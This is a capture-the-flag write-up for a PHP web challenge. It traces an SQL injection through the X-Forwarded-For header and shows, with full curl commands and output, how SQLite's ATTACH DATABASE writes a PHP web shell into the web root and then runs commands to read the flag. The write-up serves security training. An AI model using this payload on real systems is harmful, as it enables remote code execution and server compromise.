# Intergalactic Post

### Description

## Solution

On looking at the source code, it looks like the email is vulnerable to an SQL injection, as the raw variables are used in the SQL Statement

`challenge/Database.php`

```php
<?php
class Database
{
    private static $database = null;

    public function __construct($file)
    {
        if (!file_exists($file))
        {
            file_put_contents($file, '');
        }
        $this->db = new SQLite3($file);
        $this->migrate();

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function migrate()
    {
        $this->db->query('
            CREATE TABLE IF NOT EXISTS `subscribers` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL
            );
        ');
    }

    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
}
```

However, the email is checked for a proper format, as shown in `challenge/controllers/SubsController.php`

```php
<?php
class SubsController extends Controller
{
    public function __construct()
    {
        parent::__construct();
    }

    public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }

    public function logout($router)
    {
        session_destroy();
        header('Location: /admin');
        exit;
    }
}
```

As the email is checked, we could try injecting to the other parameter, `ip_address`. We can access it using the `X-Forwarded-For` Header

`challenge/models/SubscriberModel.php`

```php
<?php
class SubscriberModel extends Model
{

    public function __construct()
    {
        parent::__construct();
    }

    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
}
```

### SQL Injection -> File Write

```bash
(base) [hacker@hackerbook WIDE]$ curl -H  "X-Forwarded-For: DUMMYIP','email@email.com'); ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("'"''<pre><?php system($_GET['"'"cmd"'"']);?></pre>"'");-- " --data "email=email@email.com" 192.168.1.6:1337/subscribe -v
*   Trying 192.168.1.6:1337...
* Connected to 192.168.1.6 (192.168.1.6) port 1337 (#0)
> POST /subscribe HTTP/1.1
> Host: 192.168.1.6:1337
> User-Agent: curl/7.71.1
> Accept: */*
> X-Forwarded-For: DUMMYIP','email@email.com'); ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<pre><?php system($_GET['cmd']);?></pre>");-- 
> Content-Length: 21
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 21 out of 21 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Server: nginx
< Date: Sun, 15 May 2022 16:46:40 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/7.4.29
< Location: /?success=true&msg=Email subscribed successfully!
< 
* Connection #0 to host 192.168.1.6 left intact
(base) [hacker@hackerbook WIDE]$ 
```

```bash
/www # ls
Database.php  Router.php    controllers   index.php     models        static        test.php      views
/www # cat /tmp/challenge.db 
��P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�a##�	tablesubscriberssubscribersCREATE TABLE `subscribers` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL
��#subscribers/www # email.com!+172.17.0.1email@email.com
/www # cat /tmp/challenge.db 
��P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�a##�	tablesubscriberssubscribersCREATE TABLE `subscribers` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL
��#subscribers/www # l.com!+172.17.0.1email@email.com!+172.17.0.1email@email.com
/www # ls
Database.php  Router.php    controllers   index.php     lol.php       models        static        test.php      views
/www # 
```

![](Pasted%20image%2020220516004751.png)

### Final Exploit

```bash
(base) [hacker@hackerbook WIDE]$ curl -H  "X-Forwarded-For: DUMMYIP','email@email.com'); ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("'"''<pre><?php system($_GET['"'"cmd"'"']);?></pre>"'");-- " --data "email=email@email.com" 206.189.126.144:30242/subscribe 
(base) [hacker@hackerbook WIDE]$ curl http://206.189.126.144:30242/lol.php?cmd=cat%20/flag* | tail
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8187    0  8187    0     0  15535      0 --:--:-- --:--:-- --:--:-- 15505
��*]<pre>HTB{inj3ct3d_th3_tru7h}(dataz text)
</pre>(base) [hacker@hackerbook WIDE]$ 
```

## Flag
`HTB{inj3ct3d_th3_tru7h}`